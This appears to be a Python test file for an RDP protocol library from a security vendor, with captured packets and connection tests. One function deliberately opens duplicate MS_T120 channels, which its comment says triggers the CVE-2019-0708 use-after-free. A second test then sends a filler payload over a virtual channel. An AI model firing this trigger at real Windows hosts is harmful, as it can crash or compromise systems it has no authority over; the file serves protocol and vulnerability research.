#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  test_librdp.py
## Description:
##            :
## Created_On :  Wed May 22 2019
##
## Created_By :  X. (based on bas/nicop's libs)
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
################################################################################

import sys
import os
import re
import copy
import struct
import socket
import logging
import time

if '.' not in sys.path:
    sys.path.append('.')

import librdp
from libs.rdp.rdpconst import *
from libs.tlslite.api import *

###
# test_unpack0 objects
###

pkts = [ None for i in xrange(23) ]

pkts[0]  = "0300002924e00000000000436f6f6b69"
pkts[0] += "653a206d737473686173683d666f6f0d"
pkts[0] += "0a0100080003000000"
pkts[1]  = "030000130ee000000000000100080000"
pkts[1] += "000000"
pkts[2]  = "030000130ed000001234000209080000"
pkts[2] += "000000"
pkts[3]  = "030001d602f0807f658201ca04010104"
pkts[3] += "01010101ff3019020122020102020100"
pkts[3] += "0201010201000201010202ffff020102"
pkts[3] += "30190201010201010201010201010201"
pkts[3] += "0002010102020420020102301c0202ff"
pkts[3] += "ff0202fc170202ffff02010102010002"
pkts[3] += "01010202ffff02010204820169000500"
pkts[3] += "147c00018160000800100001c0004475"
pkts[3] += "6361815201c0ea000b00080080073804"
pkts[3] += "01ca03aa150400006345000044004500"
pkts[3] += "53004b0054004f0050002d0037003900"
pkts[3] += "46005600560030004300000007000000"
pkts[3] += "000000000c0000000000000000000000"
pkts[3] += "00000000000000000000000000000000"
pkts[3] += "00000000000000000000000000000000"
pkts[3] += "00000000000000000000000000000000"
pkts[3] += "000000000000000001ca010000000000"
pkts[3] += "18000f00af0735006500370037006300"
pkts[3] += "3300390035002d006600300037003200"
pkts[3] += "2d0034006300370036002d0062003100"
pkts[3] += "650063002d0066003600320066006500"
pkts[3] += "37003300000007000000000058010000"
pkts[3] += "c10000000000640000006400000004c0"
pkts[3] += "0c00150000000000000002c00c001b00"
pkts[3] += "00000000000003c05000060000007264"
pkts[3] += "70647200000000008080726470736e64"
pkts[3] += "0000000000c0636c6970726472000000"
pkts[3] += "a0c04141414141414100000000804d53"
pkts[3] += "5f543132300000000080647264796e76"
pkts[3] += "6300000080c0"
pkts[4]  = "0300021502f0807f668202090a010002"
pkts[4] += "0100301a020122020103020100020101"
pkts[4] += "020100020101020300fff80201020482"
pkts[4] += "01e3000500147c00012a14760a010100"
pkts[4] += "01c0004d63446e81cc010c0c00040008"
pkts[4] += "0000000000030c1400eb030600ec03ed"
pkts[4] += "03ee03ef03f003f103020cac01020000"
pkts[4] += "00020000002000000078010000a3e8a0"
pkts[4] += "a6c19562ea3af0e333d14b4700def740"
pkts[4] += "25cfd6cb700fec0c4fbd3aaeac010000"
pkts[4] += "00010000000100000006001c01525341"
pkts[4] += "310801000000080000ff000000010001"
pkts[4] += "008fba43d6992d69cc2e763b0009c206"
pkts[4] += "13d08b60ddf6cc4c1606726357a4f737"
pkts[4] += "96b88df3111045c7ed37107364d6a135"
pkts[4] += "611b6b1df121193329df52718cd1dab1"
pkts[4] += "3abb46e1ac680707f452b1d02a9af223"
pkts[4] += "e6b6d25f05b60127386c7381f1ac6466"
pkts[4] += "4856808f552d9bc51ca4be7ae997d17d"
pkts[4] += "46047023f41a7c9c842c96b5459277cb"
pkts[4] += "78f071ecc555a628b5cc22c6f84fad61"
pkts[4] += "37ef5fc3d91ff8d2a0f4dda3d585976e"
pkts[4] += "70fcbe75be1d04c6bda9802309d5689c"
pkts[4] += "0d6fac609279b0a5e0f6faee215565f8"
pkts[4] += "b6c6ffe7e608ba828e689e46672225fb"
pkts[4] += "727fc10ddb8348723ec45898a3f4723d"
pkts[4] += "373283e218006eb305c32488705ccffb"
pkts[4] += "c754e3ffd6b7c4880c5e269a0495d04d"
pkts[4] += "ab000000000000000008004800d7ef95"
pkts[4] += "8b1dc2052e65524177cae57633b455b2"
pkts[4] += "535252dc383de054a7568736c7fa5cb1"
pkts[4] += "67523d89a2cd561d6f820c3c804a7635"
pkts[4] += "3f05c5b971c9ddae8c3bd1da5a000000"
pkts[4] += "0000000000"
pkts[5] = "0300000c02f0800401000100"
pkts[6] = "0300000802f08028"
pkts[7] = "0300000b02f0802e000009"
pkts[8] = "0300000c02f08038000803f1"
pkts[9] = "0300000d02f0803ca0000803f1"
pkts[10] = "0300000c02f08038000803eb"
pkts[11] = "0300000d02f0803ca0000803eb"
pkts[12] = "0300000c02f08038000803ec"
pkts[13] = "0300000d02f0803ca0000803ec"
pkts[14] = "0300000c02f08038000803ed"
pkts[15] = "0300000d02f0803ca0000803ed"
pkts[16] = "0300000c02f08038000803ee"
pkts[17] = "0300000d02f0803ca0000803ee"
pkts[18] = "0300000c02f08038000803ef"
pkts[19] = "0300000d02f0803ca0000803ef"
pkts[20] = "0300000c02f08038000803f0"
pkts[21] = "0300000d02f0803ca0000803f0"
pkts[22]  = "0300005e02f08064000803eb70500102"
pkts[22] += "0000480000007bd4900c1cd30b8a8d13"
pkts[22] += "8b8c678ac5bd3fc71090f2a97e0ad8a1"
pkts[22] += "f38646f8e96f0085f8998a9fb79f20c1"
pkts[22] += "d00ff97c4ea6430759b62c0ece45f196"
pkts[22] += "da412f03854c00000000000000000300"
pkts[22] += "010502f08064000303eb7080f6480000"
pkts[22] += "0095d326f2ae9e430bbeda49fc077c46"
pkts[22] += "4195ab6160eece04ae8f0daa68db8d74"
pkts[22] += "97fa8abc441176987e1bf97b86509fb7"
pkts[22] += "7c7be3add3063c623dc558957d208963"
pkts[22] += "abe3a14919d711a4f28e65043aba44b9"
pkts[22] += "adc2580b5b4dd4ecd63f02a92056e653"
pkts[22] += "846a64f64e1914e9c0b4c7c52f9db7b8"
pkts[22] += "293fc50d6dea3ddb9fe5d143c45f7103"
pkts[22] += "5b3acffae4410dad4e0f4aa12ed0296f"
pkts[22] += "e8b4f1962a34faddde62683658078459"
pkts[22] += "9faf6417443d523f35c08b9d96a2d648"
pkts[22] += "fc4dcef3cdbd5772fd5bcdb7e0aad4f4"
pkts[22] += "3d3cd2abba4a743afc217bf1316a1dfa"
pkts[22] += "70ffe13a7dee28812206581604e0f130"
pkts[22] += "c8619e95b754e9e99d3255d067442c90"
pkts[22] += "cec7d0"

def test_unpack0():
    '''
    Simple unpacking test.
    '''

    for data in pkts:
        if data:
            logging.debug('PKT: %s' % data)
            raw = data.decode('hex')
            pkt = librdp.RdpPacket()
            pkt.unserialize(raw)
            print pkt

###
# test_connect{0,1} objects
###

#TARGET='192.168.50.169'
TARGET='192.168.1.9'

def test_connect_rdp_128():
    '''
    Test a connection using RDP security (128 bits key)
    '''

    sockaddr = (TARGET, 3389)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(sockaddr)

    rdp = librdp.RDP(s)
    rdp.set_timeout(15)
    ret, x = rdp.connection_request(cookie='Cookie: mstshash=foobar', requestedProtocols=PROTOCOL_RDP)
    if ret:
        logging.error('[-] connection_request() failed!')
        return -1

    selected_protocol, server_flags = x
    if selected_protocol != PROTOCOL_RDP:
        logging.error('[-] connection_request() failed! Server rejected RDP protocol and forced %d instead!' % selected_protocol)
        return -1

    chans = rdp.create_channels()
    ret, x = rdp.connect_initial(encryption=ENCRYPTION_METHOD_128BIT, channels=chans)
    if ret:
        print ('[-] connect_initial() failed!')
        return -2

    io_channel_id, channel_ids, srandom = x

    ret, _ = rdp.erect_domain()
    if ret:
        logging.error('[-] erect_domain() failed!')
        return -3

    ret, x = rdp.attach_user()
    if ret:
        logging.error('[-] attach_user() failed!')
        return -4

    # Joining the user_channel_id
    user_channel_id = x[0]
    ret, _ = rdp.channel_join(channel_id=user_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % user_channel_id)
        return -5

    # Joining the io_channel_id
    ret, _ = rdp.channel_join(channel_id=io_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % io_channel_id)
        return -6

    # Joining the user-defined channel IDs
    for chan_id in channel_ids:
        ret, _ = rdp.channel_join(channel_id=chan_id, initiator=user_channel_id, )
        if ret:
            logging.warn('[-] channel_join(%d) failed!' % chan_id)

    ret, _ = rdp.sec_exchange(io_channel_id)
    if ret:
        logging.error('[-] sec_exchange() failed!')
        return -7

    ret, _ = rdp.client_info(io_channel_id)
    if ret:
        logging.error('[-] client_info() failed!')
        return -8

    ret, _ = rdp.client_confirm_active(io_channel_id)
    if ret:
        logging.error('[-] client_confirm_active() failed!')
        return -9

    ret, _ = rdp.synchronize(io_channel_id)
    if ret:
        logging.error('[-] synchronize() failed!')
        return -10

    ret, _ = rdp.control_cooperate(io_channel_id)
    if ret:
        logging.error('[-] control_cooperate() failed!')
        return -11

    ret, _ = rdp.control_request_control(io_channel_id)
    if ret:
        logging.error('[-] control_request_control() failed!')
        return -12

    ret, _ = rdp.persistent_key_list(io_channel_id)
    if ret:
        logging.error('[-] persistent_key_list() failed!')
        return -13

    ret, _ = rdp.client_font_list(io_channel_id)
    if ret:
        logging.error('[-] client_font_list() failed!')
        return -14

    rdp.close()
    return 0


def test_connect_TLS():
    '''
    Test a connection using RDP security (128 bits key)
    '''

    sockaddr = (TARGET, 3389)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(sockaddr)

    rdp = librdp.RDP(s)
    rdp.set_timeout(15)
    ret, x = rdp.connection_request(cookie='Cookie: mstshash=foobar', requestedProtocols=PROTOCOL_SSL)
    if ret:
        logging.error('[-] connection_request() failed!')
        return -1

    selected_protocol, server_flags = x
    if selected_protocol != PROTOCOL_SSL:
        logging.error('[-] connection_request() failed! Server rejected RDP protocol and forced %d instead!' % selected_protocol)
        return -1

	# TODO: The TLS code will be added within create_channels() at some point
    connection = TLSConnection(rdp.socket)
    connection.handshakeClientCert()
    #print connection.session.serverCertChain
    rdp.socket = connection

    chans = rdp.create_channels()
    ret, x = rdp.connect_initial(encryption=ENCRYPTION_METHOD_NONE, channels=chans)
    if ret:
        print ('[-] connect_initial() failed!')
        return -2

    io_channel_id, channel_ids, srandom = x

    ret, _ = rdp.erect_domain()
    if ret:
        logging.error('[-] erect_domain() failed!')
        return -3

    ret, x = rdp.attach_user()
    if ret:
        logging.error('[-] attach_user() failed!')
        return -4

    # Joining the user_channel_id
    user_channel_id = x[0]
    ret, _ = rdp.channel_join(channel_id=user_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % user_channel_id)
        return -5

    # Joining the io_channel_id
    ret, _ = rdp.channel_join(channel_id=io_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % io_channel_id)
        return -6

    # Joining the user-defined channel IDs
    for chan_id in channel_ids:
        ret, _ = rdp.channel_join(channel_id=chan_id, initiator=user_channel_id, )
        if ret:
            logging.warn('[-] channel_join(%d) failed!' % chan_id)

	# Note: No security exchange with TLS!

    ret, _ = rdp.client_info(io_channel_id)
    if ret:
        logging.error('[-] client_info() failed!')
        return -8

    ret, _ = rdp.client_confirm_active(io_channel_id)
    if ret:
        logging.error('[-] client_confirm_active() failed!')
        return -9

    ret, _ = rdp.synchronize(io_channel_id)
    if ret:
        logging.error('[-] synchronize() failed!')
        return -10

    ret, _ = rdp.control_cooperate(io_channel_id)
    if ret:
        logging.error('[-] control_cooperate() failed!')
        return -11

    ret, _ = rdp.control_request_control(io_channel_id)
    if ret:
        logging.error('[-] control_request_control() failed!')
        return -12

    ret, _ = rdp.persistent_key_list(io_channel_id)
    if ret:
        logging.error('[-] persistent_key_list() failed!')
        return -13

    ret, _ = rdp.client_font_list(io_channel_id)
    if ret:
        logging.error('[-] client_font_list() failed!')
        return -14

    rdp.close()
    return 0


def create_channels(bug=0):
    '''
    Creates a list of channel.
    If bug is 1, we create the condition to trigger the UAF (CVE_2019_0708)
    '''

    chans = []
    chans.append(('rdpdr', CHANNEL_OPTION_INITIALIZED|CHANNEL_OPTION_COMPRESS_RDP|CHANNEL_OPTION_ENCRYPT_RDP))
    chans.append(('rdpsnd', CHANNEL_OPTION_INITIALIZED|CHANNEL_OPTION_COMPRESS_RDP|CHANNEL_OPTION_ENCRYPT_RDP))
    if bug:
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
    return chans

def test_tls_vc_data():
    '''
    Test a connection using RDP security (128 bits key)
    '''

    sockaddr = (TARGET, 3389)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(sockaddr)

    rdp = librdp.RDP(s)
    rdp.set_timeout(15)
    ret, x = rdp.connection_request(cookie='Cookie: mstshash=foobar', requestedProtocols=PROTOCOL_SSL)
    if ret:
        logging.error('[-] connection_request() failed!')
        return -1

    selected_protocol, server_flags = x
    if selected_protocol != PROTOCOL_SSL:
        logging.error('[-] connection_request() failed! Server rejected RDP protocol and forced %d instead!' % selected_protocol)
        return -1

	# TODO: The TLS code will be added within create_channels() at some point
    connection = TLSConnection(rdp.socket)
    connection.handshakeClientCert()
    #print connection.session.serverCertChain
    rdp.socket = connection

    chans = create_channels(bug=1) #rdp.create_channels()
    ret, x = rdp.connect_initial(encryption=ENCRYPTION_METHOD_NONE, channels=chans)
    if ret:
        print ('[-] connect_initial() failed!')
        return -2

    io_channel_id, channel_ids, srandom = x

    ret, _ = rdp.erect_domain()
    if ret:
        logging.error('[-] erect_domain() failed!')
        return -3

    ret, x = rdp.attach_user()
    if ret:
        logging.error('[-] attach_user() failed!')
        return -4

    # Joining the user_channel_id
    user_channel_id = x[0]
    ret, _ = rdp.channel_join(channel_id=user_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % user_channel_id)
        return -5

    # Joining the io_channel_id
    ret, _ = rdp.channel_join(channel_id=io_channel_id)
    if ret:
        logging.error('[-] channel_join(%d) failed!' % io_channel_id)
        return -6

    # Joining the user-defined channel IDs
    for chan_id in channel_ids:
        ret, _ = rdp.channel_join(channel_id=chan_id, initiator=user_channel_id, )
        if ret:
            logging.warn('[-] channel_join(%d) failed!' % chan_id)

	# Note: No security exchange with TLS!

    ret, _ = rdp.client_info(io_channel_id)
    if ret:
        logging.error('[-] client_info() failed!')
        return -8

    ret, _ = rdp.client_confirm_active(io_channel_id)
    if ret:
        logging.error('[-] client_confirm_active() failed!')
        return -9

    ret, _ = rdp.synchronize(io_channel_id)
    if ret:
        logging.error('[-] synchronize() failed!')
        return -10

    ret, _ = rdp.control_cooperate(io_channel_id)
    if ret:
        logging.error('[-] control_cooperate() failed!')
        return -11

    ret, _ = rdp.control_request_control(io_channel_id)
    if ret:
        logging.error('[-] control_request_control() failed!')
        return -12

    ret, _ = rdp.persistent_key_list(io_channel_id)
    if ret:
        logging.error('[-] persistent_key_list() failed!')
        return -13

    ret, _ = rdp.client_font_list(io_channel_id)
    if ret:
        logging.error('[-] client_font_list() failed!')
        return -14

    #rdp.send_vc_data(io_channel_id, payload='A'*3500, expect_answer=False)
    rdp.send_vc_data2(1009, payload='A'*3500, expect_answer=False)
    #rdp.send_vc_data2(io_channel_id+1, payload='B'*3500, expect_answer=False)
    #time.sleep(55)
    #rdp.send_vc_data2(io_channel_id, payload='B'*55000, expect_answer=False)
    #time.sleep(100)

    rdp.close()
    return 0


if __name__ == "__main__":


    Log = logging.getLogger()
    Log.setLevel(logging.INFO)

    if len(sys.argv) >= 2 and sys.argv[1] == 'verbose':
        Log.setLevel(logging.DEBUG)

    #test_tls_vc_data()
    #test_unpack0()
    #test_connect_rdp_128()
    start = time.time()
    test_connect_TLS()
    end = time.time()
    time_taken = end - start
    print('1 RDP/TLS connection created in %.3f (s)' % (time_taken))
